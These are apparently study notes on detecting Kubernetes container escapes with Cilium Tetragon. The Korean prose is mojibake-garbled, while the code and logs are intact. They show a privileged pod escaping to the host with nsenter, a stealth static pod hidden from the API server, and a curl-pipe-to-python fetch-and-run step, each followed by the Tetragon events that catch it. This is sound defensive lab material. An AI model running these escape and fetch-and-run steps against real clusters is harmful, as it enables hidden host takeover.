**Table of Contents**
---
- [**Table of Contents**](#table-of-contents)
- [cilium security base](#cilium-security-base)
  - [Security Observability](#security-observability)
  - [Tetragon](#tetragon)
    - [Tetragon install](#tetragon-install)
    - [ì»¨í…Œì´ë„ˆ íƒˆì¶œ ê°ì§€](#ì»¨í…Œì´ë„ˆ-íƒˆì¶œ-ê°ì§€)
  - [Static Podì˜ ë©”ëª¨ë¦¬ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰](#static-podì˜-ë©”ëª¨ë¦¬ì—ì„œ-ì•…ì„±-ìŠ¤í¬ë¦½íŠ¸-ì‹¤í–‰)
  - [ì´ë²¤íŠ¸ ë°œìƒê³¼ ë™ì‹œì— ì°¨ë‹¨](#ì´ë²¤íŠ¸-ë°œìƒê³¼-ë™ì‹œì—-ì°¨ë‹¨)

## cilium security base

- Identity-Based(Layer3), Port Level(Layer4), Application protocol Level(Layer7) ë³´ì•ˆ ì •ì±… ì œê³µ
- host level policyë¥¼ í†µí•´ì„œ ë…¸ë“œì— ë°©í™”ë²½ ì •ì±…ì„ ciliumìœ¼ë¡œ ê±¸ ìˆ˜ë„ ìˆë‹¤.

### Security Observability

- ì¸ì‹œë˜íŠ¸(incident)ì™€ ê´€ë ¨ëœ ì´ë²¤íŠ¸ì— ëŒ€í•œ ë§ì€ ë§¥ë½(context)ì„ ì œê³µí•˜ëŠ” ê²ƒ
- Linux ì»¤ë„ ê¸°ìˆ ì¸ eBPFë¥¼ í™œìš©í•˜ì—¬ ë³´ì•ˆ ê´€ì¸¡ ê°€ëŠ¥ì„±(Security Observability)ì„ ì‹¤í˜„, ì´ë¥¼ í†µí•´ í”„ë¡œë•ì…˜ í™˜ê²½ì˜ ë³´ì•ˆì„ ê°•í™”

### Tetragon

![alt text](./_image/Tetragon.png)

- Tetragonì€ Cilium ê°œë°œì‚¬ì—ì„œ ë§Œë“  ì˜¤í”ˆ ì†ŒìŠ¤ ë³´ì•ˆ ê´€ì°° ë° ëŸ°íƒ€ì„ ì‹œí–‰ ë„êµ¬
- ì‚¬ìš©ìê°€ ì œê³µí•œ êµ¬ì„±ì„ í†µí•´ ë‹¤ì–‘í•œ í”„ë¡œì„¸ìŠ¤ ë° ë„¤íŠ¸ì›Œí¬ ì´ë²¤íŠ¸ ìœ í˜•ì„ ìº¡ì²˜í•˜ì—¬ ì»¤ë„ì˜ ì„ì˜ì˜ í›„í¬ í¬ì¸íŠ¸ì— ëŒ€í•œ ë³´ì•ˆ ê´€ì°°ì„ í™œì„±í™”í•œ ë‹¤ìŒ, ì´ëŸ¬í•œ ì´ë²¤íŠ¸ë¥¼ ë³´ì•ˆ íŒ€ì„ ìœ„í•œ ì‹¤í–‰ ê°€ëŠ¥í•œ ì‹ í˜¸ë¡œ ë³€í™˜
- Tetragonì€ Cilium í”„ë¡œì íŠ¸ì˜ ì¼ë¶€ì´ì§€ë§Œ, ì‹¤í–‰í•˜ëŠ” ë° Ciliumì´ë‚˜ Hubbleì´ í•„ìš”í•˜ì§€ ì•Šê³  ë…ë¦½ì ìœ¼ë¡œ ì§„í–‰ë˜ëŠ” í”„ë¡œì íŠ¸ë‹¤.
- ["Security Observability with eBPF"](https://isovalent.com/blog/post/2022-04-oreilly-security) - Book
- Cilium Tetragonì€ ë³´ì•ˆ ê´€ì°° ì´ë²¤íŠ¸ ì¶”ì¶œ, ì´ë²¤íŠ¸ í•„í„°ë§, ì§‘ê³„ ë° ì™¸ë¶€ ì´ë²¤íŠ¸ ìˆ˜ì§‘ê¸°ë¡œì˜ ë‚´ë³´ë‚´ê¸°ë¥¼ ìœ„í•œ eBPF ë¡œì§ì„ êµ¬í˜„í•˜ëŠ” ë°ëª¬ì…‹ìœ¼ë¡œ ì‹¤í–‰


#### Tetragon install

- tetragon install yaml 

```yaml
tetragon:
  btf: /sys/kernel/btf/vmlinux
  enableCiliumAPI: false
  exportAllowList: ""
  exportDenyList: ""
  exportFilename: "tetragon.log"
  enableProcessCred: true
  enableProcessNs: true
tetragonOperator:
  enabled: true
```

```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon \
  -n kube-system -f tetragon.yaml --version 1.1.0
```

```bash
kubectl rollout status -n kube-system ds/tetragon -w
```

- `TracingPolicy` : ì»¤ë„ì—ì„œ ì„ì˜ì˜ ì´ë²¤íŠ¸ë¥¼ ì¶”ì í•˜ê³  ì¼ì¹˜í•˜ëŠ” ê²½ìš° ìˆ˜í–‰í•  ì‘ì—…ì„ ì •ì˜
- ì•„ë˜ì˜ ì •ì±…ì€ ë„¤íŠ¸ì›Œí‚¹ ì´ë²¤íŠ¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ê³  ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì„ ì¶”ì í•˜ëŠ” ë° ì‚¬ìš©

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "networking"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
     - index: 0
       type: "sock"
  - call: "tcp_close"
    syscall: false
    args:
     - index: 0
       type: "sock"
```

```bash
kubectl apply -f networking.yaml
```

- tetragon ì‹¤í–‰

```bash
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact
ğŸ”Œ connect kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:33048 -> 127.0.0.1:2381 ğŸ›‘ CAP_SYS_ADMIN
ğŸ§¹ close   kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:2381 -> 127.0.0.1:33048 ğŸ›‘ CAP_SYS_ADMIN
ğŸ§¹ close   kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:33048 -> 127.0.0.1:2381 ğŸ›‘ CAP_SYS_ADMIN
ğŸ”Œ connect kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:34708 -> 127.0.0.1:8080 ğŸ›‘ CAP_SYS_ADMIN
ğŸ§¹ close   kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:34708 -> 127.0.0.1:8080 ğŸ›‘ CAP_SYS_ADMIN
...
```

- `TracingPolicy`ì— ì •ì˜ëœ tcp_connect, tcp_close syscall ì´ë²¤íŠ¸ë¥¼ ê°ì§€í•˜ê³ , í™”ë©´ì— ì¶œë ¥í•´ì¤€ë‹¤.

#### ì»¨í…Œì´ë„ˆ íƒˆì¶œ ê°ì§€

- ì»¨í…Œì´ë„ˆ ì´ìŠ¤ì¼€ì´í”„ë¥¼ ë‹¨ê³„ë³„ë¡œ ê°ì§€í•˜ëŠ” ë°©ë²• í™•ì¸
- ì§€ë‚˜ì¹˜ê²Œ ê¶Œí•œì´ ë¶€ì—¬ëœ Podë¥¼ í™œìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì˜ ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ì ‘ê·¼
- ê·¸ ë‹¤ìŒ `/etc/kubernetes/manifests` ë””ë ‰í„°ë¦¬ì— íŒŒë“œ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ë¥¼ ì‘ì„±í•´ì„œ `kubelet`ìœ¼ë¡œ Static POdë¥¼ ë°°í¬ ì‹œí‚¨ë‹¤. 
  - ì—¬ê¸°ì„œ ì¿ ë²„ë„¤í‹°ìŠ¤ ë²„ê·¸ë¥¼ ì´ìš©í•´ì„œ ì¿ ë²„ë„¤í‹°ìŠ¤ API ì„œë²„ê°€ íŒŒë“œë¥¼ ê°ì§€í•˜ì§€ ëª»í•˜ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ìŠ¤í…”ìŠ¤ íŒŒë“œë¥¼ ì„¤ì¹˜í•œë‹¤.
  - kubeletì´ static podë¥¼ ìƒì„±í•˜ëŠ” ê²½ë¡œëŠ” ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
    ```bash
    root@control:~# grep -i staticPodPath /var/lib/kubelet/config.yaml
    staticPodPath: /etc/kubernetes/manifests
    ```
  - í•´ë‹¹ ìœ„ì¹˜ì— yaml íŒŒì¼ì´ ë°°ì¹˜ë˜ë©´ kubeletì´ static pod ìƒì„±ì„ ì‹œì‘í•˜ëŠ”ë°, kubectl ëª…ë ¹ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ê³¼ì •ê³¼ ë™ì‘ ë°©ì‹ì´ ë‹¤ë¥´ë‹¤.
  - kubectl ë¡œ ë¦¬ì†ŒìŠ¤ë¥¼ ìƒì„±í•  ê²½ìš° kubectl > api server > etcd í”„ë¡œì„¸ìŠ¤ë¥¼ ê±°ì³ namespace ìœ ë¬´ë¥¼ í™•ì¸ í›„ ì¡´ì¬í•˜ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ë§Œ íŒŒë“œë¥¼ ë°°í¬í•œë‹¤.
    ```bash
    root@server:~# k apply -f stealth-static-pod.yaml 
    Error from server (NotFound): error when creating "stealth-static-pod.yaml": namespaces "nonexistent-namespace-12345" not found
    root@server:~# cat stealth-static-pod.yaml 
    apiVersion: v1
    kind: Pod
    metadata:
      name: stealth-pod
      namespace: nonexistent-namespace-12345  # ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤!
    spec:
      containers:
      - name: nginx
        image: nginx
    ```
  - kubeletì€ í•´ë‹¹ ê²½ë¡œì— yaml íŒŒì¼ì„ ì½ì–´ ë°”ë¡œ crië¥¼ í†µí•´ íŒŒë“œë¶€í„° ìƒì„±í•œ ë‹¤ìŒ api serverì—ì„œ mirror pod ì •ë³´ë¥¼ ì…ë ¥í•˜ëŠ”ë°, ì´ ë•Œ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¡œ ìƒì„± ìš”ì²­ì´ ë“¤ì–´ì˜¤ë©´ ì‹¤íŒ¨ë¡œ ì²˜ë¦¬ëœë‹¤.
- ê·¸ë¦¬ê³  ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë©”ëª¨ë¦¬ì— ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ë©´, ë””ìŠ¤í¬ì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šê³  ê¸°ì¡´ì˜ User space íƒì§€ ë„êµ¬ë¡œëŠ” í™•ì¸ì´ ê±°ì˜ ë¶ˆê°€ëŠ¥í•œ ê³µê²©ì´ ëœë‹¤.
- privileged í”Œë˜ê·¸ëŠ” ì»¨í…Œì´ë„ˆì— ëª¨ë“  Linux ê¸°ëŠ¥ê³¼ í˜¸ìŠ¤íŠ¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•œë‹¤.
- `privileged` í”Œë˜ê·¸ê°€ ì§€ì •ëœ íŒŒë“œì—ì„œ ì»¨í…Œì´ë„ˆ ì´ìŠ¤ì¼€ì´í”„ê°€ ê°€ëŠ¥í•´ì§„ë‹¤.
- ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œëŠ” `privileged` í”Œë˜ê·¸ë¥¼ ê¸°ë³¸ì ìœ¼ë¡œ í—ˆìš©í•œë‹¤.
- hostPIDë° hostNetworkí”Œë˜ê·¸ëŠ” ì»¨í…Œì´ë„ˆë¥¼ ê°ê° í˜¸ìŠ¤íŠ¸ PIDì™€ ë„¤íŠ¸ì›Œí‚¹ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ì‹¤í–‰í•˜ì—¬ ë…¸ë“œì˜ ëª¨ë“  í”„ë¡œì„¸ìŠ¤ ë° ë„¤íŠ¸ì›Œí¬ ë¦¬ì†ŒìŠ¤ì™€ ì§ì ‘ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆê²Œ í•œë‹¤.

- ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ì„œ `sith-infiltrator` íŒŒë“œì™€ ê´€ë ¨ëœ ì´ë²¤íŠ¸ ì¶”ì ì„ ì‹¤í–‰ ì‹œí‚¤ê³  ë‹¤ìŒ ì‘ì—…ì„ ì´ì–´ì„œ í•œë‹¤.

```bash
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact --pods sith-infiltrator
```

- hostPIDë° hostNetworkí”Œë˜ê·¸ê°€ í¬í•¨ëœ íŒŒë“œë¥¼ ë°°í¬í•œë‹¤.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sith-infiltrator
  labels:
    org: empire
spec:
  hostPID: true         # í˜¸ìŠ¤íŠ¸ì˜ PID ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µìœ 
  hostNetwork: true     # í˜¸ìŠ¤íŠ¸ì˜ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µìœ 
  containers:
  - name: sith-infiltrator
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true  # ëª¨ë“  ê¶Œí•œ ë¶€ì—¬
```

```bash
kubectl apply -f sith-infiltrator.yaml
```

- `sith-infiltrator` íŒŒë“œì—ì„œ `/docker-entrypoint.sh` ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ë©° í”„ë¡œì„¸ìŠ¤ê°€ ì‹œì‘ ë¨
```bash
ğŸš€ process default/sith-infiltrator /docker-entrypoint.sh /docker-entrypoint.sh nginx -g "daemon off;" ğŸ›‘ CAP_SYS_ADMIN
```

- í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ê°€ ì •ìƒ ì¢…ë£Œ ë¨

```bash
ğŸ’¥ exit default/sith-infiltrator /docker-entrypoint.d/20-envsubst-on-templates.sh [...] 0 ğŸ›‘ CAP_SYS_ADMIN
```

- setns ì‹œìŠ¤í…œ í˜¸ì¶œ ì´ë²¤íŠ¸ë¥¼ ì¶”ì í•˜ì—¬ nsenter ëª…ë ¹ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ì¼ì–´ë‚˜ëŠ” ê²ƒì„ ê°ì§€í•œë‹¤.

```bash
root@server:~# kubectl apply -f sys-setns.yaml
tracingpolicy.cilium.io/sys-setns created
root@server:~# cat sys-setns.yaml 
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "sys-setns"
spec:
  kprobes:
  - call: "sys_setns"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "int"
```

- sith-infiltrator íŒŒë“œì— ì ‘ì† í›„ ì´ë²¤íŠ¸ë¥¼ í™•ì¸í•˜ë©´ /bin/bashë¡œ ì ‘ì†í•œ ì´ë²¤íŠ¸ë¥¼ ë³¼ ìˆ˜ ìˆë‹¤.

```bash
kubectl exec -it sith-infiltrator -- /bin/bash
```

```bash
ğŸš€ process default/sith-infiltrator /bin/bash              ğŸ›‘ CAP_SYS_ADMIN
```

- ê·¸ ë‹¤ìŒ í˜¸ìŠ¤íŠ¸ì˜ PID 1 í”„ë¡œì„¸ìŠ¤(ë£¨íŠ¸)ì˜ `-a` ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤(PID, Mount, Network, UTS, IPC, User)ë¡œ ì§„ì…í•´ì„œ bash shellë¡œ ì ‘ì†í•˜ëŠ” nsenter ëª…ë ¹ì„ ì‹¤í–‰í•œë‹¤.

```bash
nsenter -t 1 -a bash
```

- setns ì´ë²¤íŠ¸ë¥¼ í™•ì¸í•œë‹¤.
- í˜¸ìŠ¤íŠ¸ì˜ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ cgroup, ipc, uts, net, pid, mnt, timeìœ¼ë¡œ ì ‘ì†ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

```bash
ğŸš€ process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter cgroup         ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter ipc            ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter uts            ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter net            ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter pid            ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter mnt            ğŸ›‘ CAP_SYS_ADMIN
ğŸ”§ setns   default/sith-infiltrator /usr/bin/nsenter time           ğŸ›‘ CAP_SYS_ADMIN
```

- `/etc/kubernetes/manifests` í´ë”ì— ìˆëŠ” íŒŒì¼ì— ë³€ê²½ì´ ë°œìƒí•˜ë©´ ì´ë²¤íŠ¸ë¥¼ ë‚¨ê¸°ë„ë¡ ì„¤ì •í•˜ëŠ” `TracingPolicy`ë¥¼ ì„¤ì •í•œë‹¤.
- ë¦¬ëˆ…ìŠ¤ëŠ” security_file_permission í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìì‹ ì´ íŒŒì¼ì— ì ‘ê·¼í•  ë•Œ ê¶Œí•œì´ ìˆëŠ”ì§€ë¥¼ í™•ì¸í•˜ê²Œ ëœë‹¤.
- ê·¸ë˜ì„œ íŒŒë“œì—ì„œ security_file_permission í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ ì´ë²¤íŠ¸ë¥¼ ì¶”ì í•˜ê²Œ ë˜ê³  ê·¸ ë•Œ í•´ë‹¹ íŒŒì¼ì˜ ì²« ë²ˆì¬, ë‘ ë²ˆì¬ Parameter ê°’ì„ ê¸°ë°˜ìœ¼ë¡œ ì´ë²¤íŠ¸ë¥¼ ìƒì„±í•œë‹¤.
- ì´ ë•Œ, ì²« ë²ˆì§¸ Parameterì˜ ê°’ì´ `/etc/kubernetes/manifests` í´ë”ì¼ ë•Œ ë§Œ ì´ë²¤íŠ¸ë¥¼ ë‚¨ê¸´ë‹¤.

```bash
root@server:~# kubectl apply -f sys-write-etc-kubernetes-manifests.yaml
tracingpolicy.cilium.io/file-write-etc-kubernetes-manifests created
root@server:~# cat sys-write-etc-kubernetes-manifests.yaml 
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "file-write-etc-kubernetes-manifests"
spec:
  podSelector:
    matchLabels:
     org: empire    # íŠ¹ì • íŒŒë“œ ì„ íƒ
  options:
  - name: "disable-kprobe-multi"
    value: "1"
  kprobes:
  - call: "security_file_permission"    # security_file_permission í•¨ìˆ˜ëŠ” íŒŒì¼ ì ‘ê·¼ ê¶Œí•œì„ í™•ì¸í•˜ëŠ” ì—­í• 
    syscall: false
    args:
    - index: 0
      type: "file"                      # ì²« ë²ˆì§¸ ì¸ìì—ì„œ íŒŒì¼ ê²½ë¡œ ì •ë³´
    - index: 1
      type: "int"                       # ë‘ ë²ˆì§¸ ì¸ìì—ì„œ íŒŒì¼ ì ‘ê·¼ ê¶Œí•œ(ì½ê¸°/ì“°ê¸° ë“±) ì •ë³´
    selectors:
    - matchArgs:      
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/kubernetes/manifests"
```
- ì •ì±…ì„ ìƒì„±í–ˆìœ¼ë©´ ëª¨ë‹ˆí„°ë§ì„ ì‹œì‘í•œë‹¤.

```bash
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
```

- íŒŒë“œë¡œ ë“¤ì–´ê°€ì„œ `/etc/kubernetes/manifests/` í´ë”ë¡œ ì´ë™í•œë‹¤.

```bash
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cd /etc/kubernetes/manifests/
root@kind-control-plane:/# ls -la
total 28
drwxr-xr-x 1 root root 4096 Sep  4 13:30 .
drwxr-xr-x 1 root root 4096 Sep  4 13:30 ..
-rw------- 1 root root 2547 Sep  4 13:30 etcd.yaml
-rw------- 1 root root 3896 Sep  4 13:30 kube-apiserver.yaml
-rw------- 1 root root 3428 Sep  4 13:30 kube-controller-manager.yaml
-rw------- 1 root root 1463 Sep  4 13:30 kube-scheduler.yaml
root@kind-control-plane:/etc/kubernetes/manifests# 
```

- ì´ì œ static podë¥¼ ìƒì„±í•˜ë„ë¡ í´ë”ì— yaml íŒŒì¼ì„ í•˜ë‚˜ ìƒì„±í•œë‹¤.

```bash
cat << EOF > hack-latest.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hack-latest
  hostNetwork: true
  # define in namespace that doesn't exist so
  # workload is invisible to the API server
  namespace: doesnt-exist
spec:
  containers:
  - name: hack-latest
    image: sublimino/hack:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 10;done"]
    securityContext:
      privileged: true
EOF
```

- ê·¸ ë‹¤ìŒ `hack-latest` íŒŒë“œê°€ ìƒì„±ë˜ì—ˆëŠ”ì§€ í™•ì¸í•œë‹¤.

```bash
root@kind-control-plane:/etc/kubernetes/manifests# crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                      ATTEMPT             POD ID              POD
5ef337db7fc04       e7ba4f2341d9d       16 seconds ago      Running             hack-latest               0                   10fde2a49fca3       hack-latest-kind-control-plane
465996a095a6f       ad5708199ec7d       49 minutes ago      Running             sith-infiltrator          0                   e1ae94aa78f60       sith-infiltrator
ca8047395676c       f872779e5c74a       About an hour ago   Running             tetragon                  0                   6a2a402b8b272       tetragon-dnsdj
c3d9e4a238265       06608740b0dac       About an hour ago   Running             tetragon-operator         0                   de79232bc8d4f       tetragon-operator-58967cbfd6-j5wnt
aeb1fe0a7a750       acc4836f7b346       About an hour ago   Running             export-stdout             0                   6a2a402b8b272       tetragon-dnsdj
fec941b87b11b       27444efca312d       About an hour ago   Running             local-path-provisioner    0                   5324f737273b2       local-path-provisioner-ccc7bf7fc-h6tgt
19d3ba7b18fa5       cbb01a7bd410d       About an hour ago   Running             coredns                   0                   47aab16f879a0       coredns-6f6b679f8f-thkm7
7d5b6b7529ee3       cbb01a7bd410d       About an hour ago   Running             coredns                   0                   d4d22eab0f326       coredns-6f6b679f8f-b44ht
...
```

- í•˜ì§€ë§Œ kubectl ëª…ë ¹ì„ í†µí•´ì„œ ì¡°íšŒí•˜ë©´ íŒŒë“œì— ë³´ì´ì§€ ì•ŠëŠ”ë‹¤.

```bash
root@server:~# kubectl get pods --all-namespaces | grep -E 'hack-latest|sith-infiltrator'
default              sith-infiltrator                             1/1     Running   0          51m
```

- ì—¬ê¸°ì„œ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ìœ¼ë¡œ ì°íŒ ì´ë²¤íŠ¸ë“¤ì„ í™•ì¸í•˜ë©´ ì´ìŠˆë¥¼ ì¶”ì í•  ìˆ˜ ìˆë‹¤.

```bash
ğŸš€ process default/sith-infiltrator /usr/bin/cat           ğŸ›‘ CAP_SYS_ADMIN
ğŸ“ write   default/sith-infiltrator /usr/bin/cat /etc/kubernetes/manifests/hack-latest.yaml ğŸ›‘ CAP_SYS_ADMIN
ğŸ“ write   default/sith-infiltrator /usr/bin/cat /etc/kubernetes/manifests/hack-latest.yaml ğŸ›‘ CAP_SYS_ADMIN
ğŸ’¥ exit    default/sith-infiltrator /usr/bin/cat  0 ğŸ›‘ CAP_SYS_ADMIN
```

### Static Podì˜ ë©”ëª¨ë¦¬ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

- ê¸°ì¡´ User Spaceì—ì„œ ì œê³µí•˜ëŠ” ë„êµ¬ë¡œëŠ” ê°ì§€ê°€ ê±°ì˜ ë¶ˆê°€ëŠ¥í•œ ë©€ì›¨ì–´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•œë‹¤.

- ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì„ ì‹¤í–‰í•œë‹¤.

```bash
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
```

- íŒŒë“œì— ì ‘ì† í›„ ë‹¤ì‹œ í˜¸ìŠ¤íŠ¸ ë…¸ë“œì˜ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ íƒˆì¶œí•œë‹¤. ê·¸ë¦¬ê³ , Static Podì˜ ì»¨í…Œì´ë„ˆ IDë¥¼ í™•ì¸í•œë‹¤.

```bash
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# CONT_ID=$(crictl ps --name hack-latest --output json | jq -r '.containers[0].id')
root@kind-control-plane:/# echo $CONT_ID
5ef337db7fc04ad358b458b52c476604e39fe64a3e9339943d02d3a61431b868
```

- ê·¸ë¦¬ê³  Static Podë¡œ ì ‘ì†í•œë‹¤.

```bash
root@kind-control-plane:/# crictl exec -it $CONT_ID /bin/bash
PRETTY_NAME="Alpine Linux v3.12"
root@hack-latest-kind-control-plane:~ [0]# 
```

- ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ í™•ì¸í•œë‹¤.

```bash
ğŸš€ process default/sith-infiltrator /usr/local/bin/crictl exec -it 5ef337db7fc04ad358b458b52c476604e39fe64a3e9339943d02d3a61431b868 /bin/bash ğŸ›‘ CAP_SYS_ADMIN
ğŸ”Œ connect default/sith-infiltrator /usr/local/bin/crictl tcp 127.0.0.1:55674 -> 127.0.0.1:34639 ğŸ›‘ CAP_SYS_ADMIN
```

- ì´ì œ ì•…ì„± í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜í•˜ê¸° ì „ì— íŠ¹ì • í”„ë¡œì„¸ìŠ¤(curl, python)ê³¼ ê´€ë ¨ëœ ì´ë²¤íŠ¸ë¥¼ ì¶”ì í•˜ê¸° ìœ„í•´ì„œ ë‹¤ìŒ ëª…ë ¹ìœ¼ë¡œ ëª¨ë‹ˆí„°ë§ì„ ì„¤ì •í•œë‹¤.

```bash
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --processes curl,python
```

- ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ëŠ”ë‹¤.

```bash
root@hack-latest-kind-control-plane:~ [0]# curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py | python
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   488  100   488    0     0   2741      0 --:--:-- --:--:-- --:--:--  2741
root@hack-latest-kind-control-plane:~ [0]# 
```

- ì´ë²¤íŠ¸ ê²°ê³¼ë¥¼ í™•ì¸í•˜ë©´ pytonì´ ì‹¤í–‰ë˜ë©´ì„œ `185.199.110.133:443` IPì™€ Portë¡œ ì†Œì¼“ ì—°ê²°ì´ ì‹œë„ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

```bash
ğŸš€ process kind-control-plane /usr/bin/python              ğŸ›‘ CAP_SYS_ADMIN
ğŸš€ process kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py ğŸ›‘ CAP_SYS_ADMIN
ğŸ”Œ connect kind-control-plane /usr/bin/curl tcp 10.244.0.6:47690 -> 185.199.110.133:443 ğŸ›‘ CAP_SYS_ADMIN
ğŸ§¹ close   kind-control-plane /usr/bin/curl tcp 10.244.0.6:47690 -> 185.199.110.133:443 ğŸ›‘ CAP_SYS_ADMIN
ğŸ’¥ exit    kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py 0 ğŸ›‘ CAP_SYS_ADMIN
ğŸ’¥ exit    kind-control-plane /usr/bin/python  0  ğŸ›‘ CAP_SYS_ADMIN
```

### ì´ë²¤íŠ¸ ë°œìƒê³¼ ë™ì‹œì— ì°¨ë‹¨

- `TracingPolicy`ì— `matchActions` í•„ë“œë¥¼ ì¶”ê°€í•œë‹¤.
- `matchActions`ì—ëŠ” ë‹¤ì–‘í•œ ë™ì‘ì„ ì •ì˜í•  ìˆ˜ ìˆë‹¤.
  - `Sigkill` í”„ë¡œì„¸ìŠ¤ë¥¼ ì¦‰ì‹œ ì¢…ë£Œ
  - `Override` í•¨ìˆ˜ ë°˜í™˜ ì¸ìˆ˜ë¥¼ ì¬ì •ì˜
  - `Signal` í”„ë¡œì„¸ìŠ¤ì— ì‹ í˜¸ ì „ë‹¬
  - `GetUrl` ì•Œë ¤ì§„ URLë¡œ GET ìš”ì²­

```bash
root@server:~# cat sys-write-etc-kubernetes-manifests.yaml 
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "file-write-etc-kubernetes-manifests"
spec:
  podSelector:
    matchLabels:
     org: empire
  options:
  - name: "disable-kprobe-multi"
    value: "1"
  kprobes:
  - call: "security_file_permission"
    syscall: false
    args:
    - index: 0
      type: "file" # (struct file *) used for getting the path
    - index: 1
      type: "int" # 0x04 is MAY_READ, 0x02 is MAY_WRITE
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/kubernetes/manifests"
      matchActions:
      - action: Override
        argError: -1
```

- ëª¨ë‹ˆí„°ë§ ì‹œì‘

```bash
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
```

